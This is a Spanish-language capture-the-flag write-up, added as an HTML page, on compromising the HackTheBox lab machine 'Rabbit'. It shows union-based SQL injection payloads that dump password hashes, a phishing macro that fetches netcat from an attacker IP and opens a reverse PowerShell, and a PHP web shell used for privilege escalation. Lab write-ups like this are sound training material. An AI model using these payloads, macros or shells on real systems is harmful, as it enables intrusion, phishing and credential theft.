@@ -1,0 +1,314 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Rabbit HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/rabbit.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Rabbit HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Rabbit de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Rabbit de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Rabbit HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Rabbit HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Rabbit de la plataforma de HackTheBox","headline":"Writeup Rabbit HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Rabbit HackTheBox</h1>
+          <p>Resolución de la máquina Rabbit de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.10.71
+Nmap scan report for 10.10.10.71
+PORT      STATE    SERVICE
+25/tcp    open     smtp
+53/tcp    open     domain
+80/tcp    open     http
+88/tcp    open     kerberos-sec
+135/tcp   open     msrpc
+389/tcp   open     ldap
+443/tcp   open     https
+445/tcp   open     microsoft-ds
+464/tcp   open     kpasswd5
+587/tcp   open     submission
+593/tcp   open     http-rpc-epmap
+636/tcp   open     ldapssl
+808/tcp   open     ccproxy-http
+3268/tcp  open     globalcatLDAP
+3269/tcp  open     globalcatLDAPssl
+3306/tcp  open     mysql
+5722/tcp  open     msdfsr
+5985/tcp  open     wsman
+8080/tcp  open     http-proxy
+9389/tcp  open     adws
+47001/tcp open     winrm</span>
+</code></pre></div></div>
+
+<div><p>El puerto 80 nos da forbidden asi que iniciamos fuzzeando el 8080 con wfuzz, vemos complain</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://rabbit.htb:8080/FUZZ -t 100 --hc 404
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://rabbit.htb:8080/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000300:   </span><span class="kd">403</span><span class="p">        11 L     33 W       307 Ch      "phpmyadmin"
+000000245:   </span><span class="s2">200</span><span class="p">        106 L    178 W      10065 Ch    "index"
+000000673:   </span><span class="na">301</span><span class="p">        9 L      29 W       326 Ch      "joomla"
+000003980:   </span><span class="s2">200</span><span class="p">        344 L    2576 W     197251 Ch   "favicon"
+000005528:   </span><span class="s2">200</span><span class="p">        106 L    178 W      10065 Ch    "Index"
+000005776:   </span><span class="kd">403</span><span class="p">        11 L     33 W       307 Ch      "phpsysinfo"
+000006277:   </span><span class="s2">301</span><span class="p">        9 L      29 W       326 Ch      "Joomla"
+000006376:   </span><span class="kd">403</span><span class="p">        11 L     33 W       300 Ch      "con"
+000011490:   </span><span class="kd">403</span><span class="p">        11 L     33 W       300 Ch      "aux"
+000016564:   </span><span class="kd">403</span><span class="p">        11 L     33 W       304 Ch      "adminer"
+000023235:   </span><span class="na">301</span><span class="p">        9 L      29 W       328 Ch      "complain"
+000026988:   </span><span class="kd">403</span><span class="p">        11 L     33 W       300 Ch      "prn"</span>
+</code></pre></div></div>
+
+<div><p>Al abrir el directorio del puerto 8080 en la web vemos un panel de autenticación</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Ya que tenemos un boton para registrarnos lo hacemos con una cuenta cualquiera</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Una vez creada la cuenta nos autenticamos en el login con las credenciales que usamos</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Buscando vulnerabilidades encontramos un error sql en el campo id de la siguiente direccion web</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">http://rabbit.htb:8080/complain/view.php?mod=admin&view=repod&id=enginner</span>
+</code></pre></div></div>
+
+<div><p>Cuando agregamos una comilla al id, nos da un error de la sintaxis de sql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">enginner'</span>
+</code></pre></div></div>
+<a href="./4.png" target="_blank"><div><p><img src="./4.png"><p></div></a>
+
+<div><p>Usando order by podemos iterar por varios numeros, bajando hasta el 8 nos da error</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">enginner order by 8-- -</span>
+</code></pre></div></div>
+<a href="./5.png" target="_blank"><div><p><img src="./5.png"><p></div></a>
+
+<div><p>Al bajar a la columna 7 se elimina el error, asi sabemos que hay 7 columnas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">enginner order by 7-- -</span>
+</code></pre></div></div>
+<a href="./6.png" target="_blank"><div><p><img src="./6.png"><p></div></a>
+
+<div><p>Podemos jugar con union para representar los campos, podemos ver varios en la web</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">engineer union select 1,2,3,4,5,6,7-- -</span>
+</code></pre></div></div>
+<a href="./7.png" target="_blank"><div><p><img src="./7.png"><p></div></a>
+
+<div><p>Podemos aprovecharnos del campo 2 para representar el nombre de la base de datos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">engineer union select 1,database(),3,4,5,6,7-- -</span>
+</code></pre></div></div>
+<a href="./8.png" target="_blank"><div><p><img src="./8.png"><p></div></a>
+
+<div><p>Esta en uso complain pero enumeremos todas las bases de datos que existgen</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">engineer union select 1,schema_name,3,4,5,6,7 from information_schema.schemata-- -</span>
+</code></pre></div></div>
+<a href="./9.png" target="_blank"><div><p><img src="./9.png"><p></div></a>
+
+<div><p>Una que parece bastante interesante es secret, enumeremos sus tablas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">engineer union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=0x736563726574-- -</span>
+</code></pre></div></div>
+<a href="./10.png" target="_blank"><div><p><img src="./10.png"><p></div></a>
+
+<div><p>Solo vemos users, enumeremos las columnas que son solo username y password</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">engineer union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema=0x736563726574 and table_name=0x7573657273-- -</span>
+</code></pre></div></div>
+<a href="./11.png" target="_blank"><div><p><img src="./11.png"><p></div></a>
+
+<div><p>Dumpeamos ambos campos y obtenemos una lista de usuarios y hashes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">engineer union select 1,concat(username,0x3a,password),3,4,5,6,7 from secret.users-- -</span>
+</code></pre></div></div>
+<a href="./12.png" target="_blank"><div><p><img src="./12.png"><p></div></a>
+
+<div><p>Los guardamos en un archivo hashes y procedemos a intentar romperlos con john</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hashes
+Kain:33903fbcc0b1046a09edfaa0a65e8f8c
+Raziel:719da165a626b4cf23b626896c213b84 
+Ariel:b9c2538d92362e0e18e52d0ee9ca0c6f
+Dimitri:d459f76a5eeeed0eca8ab4476c144ac4
+Magnus:370fc3559c9f0bff80543f2e1151c537
+Zephon:13fa8abd10eed98d89fd6fc678afaf94
+Turel:d322dc36451587ea2994c84c9d9717a1
+Dumah:33da7a40473c1637f1a2e142f4925194
+Malek:dea56e47f1c62c30b83b70eb281a6c39
+Moebius:a6f30815a43f38ec6de95b9a9d74da37
+
+</span><span class="s2">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 XOP 4x2])
+</span><span class="kd">barcelona</span><span class="p">        (</span><span class="na">Malek</span><span class="p">)
+</span><span class="kd">santiago</span><span class="p">         (</span><span class="na">Moebius</span><span class="p">)
+</span><span class="kd">popcorn</span><span class="p">          (</span><span class="na">Dumah</span><span class="p">)
+</span><span class="kd">pussycatdolls</span><span class="p">    (</span><span class="na">Ariel</span><span class="p">)
+</span><span class="kd">xNnWo6272k7x</span><span class="p">     (</span><span class="na">Magnus</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Tenemos credenciales, pero ¿donde las usamos? encontramos que en 443 esta abierto por lo que podemos fuzzear el puerto 80 por https</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u https://rabbit.htb/FUZZ -t 100 --hc 404
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://rabbit.htb/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000056:   </span><span class="na">301</span><span class="p">        1 L      10 W       156 Ch      "aspnet_client"
+000000210:   </span><span class="na">302</span><span class="p">        1 L      10 W       145 Ch      "public"
+000001300:   </span><span class="na">302</span><span class="p">        1 L      10 W       145 Ch      "exchange"
+000001112:   </span><span class="na">302</span><span class="p">        1 L      10 W       145 Ch      "Public"
+000002140:   </span><span class="kd">401</span><span class="p">        0 L      11 W       58 Ch       "rpc"
+000006711:   </span><span class="na">301</span><span class="p">        1 L      10 W       156 Ch      "Aspnet_client"
+000009312:   </span><span class="na">301</span><span class="p">        0 L      0 W        0 Ch        "owa"
+000011231:   </span><span class="na">302</span><span class="p">        1 L      10 W       145 Ch      "PUBLIC"
+000011469:   </span><span class="na">301</span><span class="p">        1 L      10 W       156 Ch      "aspnet_Client"
+000015917:   </span><span class="na">302</span><span class="p">        1 L      10 W       145 Ch      "Exchange"
+000020258:   </span><span class="na">301</span><span class="p">        1 L      10 W       156 Ch      "ASPNET_CLIENT"
+000024056:   </span><span class="kd">401</span><span class="p">        0 L      0 W        0 Ch        "ews"
+000024065:   </span><span class="na">302</span><span class="p">        1 L      10 W       145 Ch      "exchweb"
+000016720:   </span><span class="na">301</span><span class="p">        1 L      10 W       155 Ch      "autodiscover"
+000017388:   </span><span class="na">302</span><span class="p">        3 L      8 W        126 Ch      "ecp"</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver un /owa que es outlook, podemos autenticarnos en ese servicio como Ariel</p></div>
+<div><p><img src="./13.png"><p></div>
+
+<div><p>Al entrar podemos ver un panel de outlook con un mensaje de Administrator</p></div>
+<div><p><img src="./14.png"><p></div>
+
+<div><p>En este punto podemos enviar un mensaje a todos los usuarios que conocemos hasta ahora</p></div>
+<div><p><img src="./15.png"><p></div>
+
+<div><p>Podemos adjuntar archivos, ¿y si aplicamos un poco de phising mediante una macro maliciosa?</p></div>
+<div><p>Iniciamos creando un archivo de word y agregando una macro que llamaremos pwned en este caso</p></div>
+<div><p><img src="./16.png"><p></div>   
+
+<div><p>Definimos una estructura que a nivel de sistema descargue el netcat que compartiremos de nuestro lado y nos envie una powershell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">Sub Main
+    </span><span class="k">shell</span><span class="p">(</span><span class="s2">"cmd /c certutil -urlcache -split -f http://10.10.14.10/nc64.exe C:\ProgramData\nc64.exe && C:\ProgramData\nc64.exe -e powershell 10.10.14.10 443"</span><span class="p">)
+</span><span class="kd">End Sub</span>
+</code></pre></div></div>
+<a href="./17.png" target="_blank"><div><p><img src="./17.png"><p></div></a>
+
+<div><p>Ahora hacemos que la macro se ejecute en cuanto abra el archivo y asi asegurar que lo haga</p></div>
+<div><p><img src="./18.png"><p></div>
+
+<div><p>Enviamos un correo con el archivo adjunto y despues de mucho, mucho tiempo recibimos la shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.71
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+PS C:\Program Files (x86)\OpenOffice 4\program> </span><span class="no">whoami</span><span class="p">
+htb\raziel
+PS C:\Program Files (x86)\OpenOffice 4\program> </span><span class="no">cd</span><span class="p"> C:\Users\Raziel\Desktop
+PS C:\Users\Raziel\Desktop> </span><span class="no">type </span><span class="p">user.txt
+c4d**************************14f
+PS C:\Users\Raziel\Desktop></span>
+</code></pre></div></div>
+
+<div><p>Mirando la ruta donde esta corriendo la web podemos ver que tenemos capacidad de escritura</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Wamp64> </span><span class="no">icacls </span><span class="p">www
+www NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+    BUILTIN\Administrators:(I)(OI)(CI)(F)
+    BUILTIN\Users:(I)(OI)(CI)(RX)
+    BUILTIN\Users:(I)(CI)(AD)
+    BUILTIN\Users:(I)(CI)(WD)
+    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+
+PS C:\Wamp64></span>
+</code></pre></div></div>
+
+<div><p>Creamos una archivo php que nos ejecute el netcat y nos envie la shell, lo guardamos en www</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Wamp64\www> </span><span class="no">type</span><span class="p"> shell.php
+&lt?php
+    system('C:\ProgramData\nc64.exe 10.10.14.10 443 -e powershell');
+?>
+PS C:\Wamp64\www></span>
+</code></pre></div></div>
+
+<div><p>Hacemos una peticion y como administrator corre la web, hemos escalado privilegios</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">http://10.10.10.71:8080/shell.php
+</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.71
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+PS C:\Wamp64\www> </span><span class="no">whoami</span><span class="p">
+nt authority\system
+PS C:\Wamp64\www> </span><span class="no">cd </span><span class="p">C:\Users\Administrator\Desktop
+PS C:\Users\Administrator\Desktop> </span><span class="no">type </span><span class="p">root.txt
+0b2**************************6f3
+PS C:\Users\Administrator\Desktop></span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
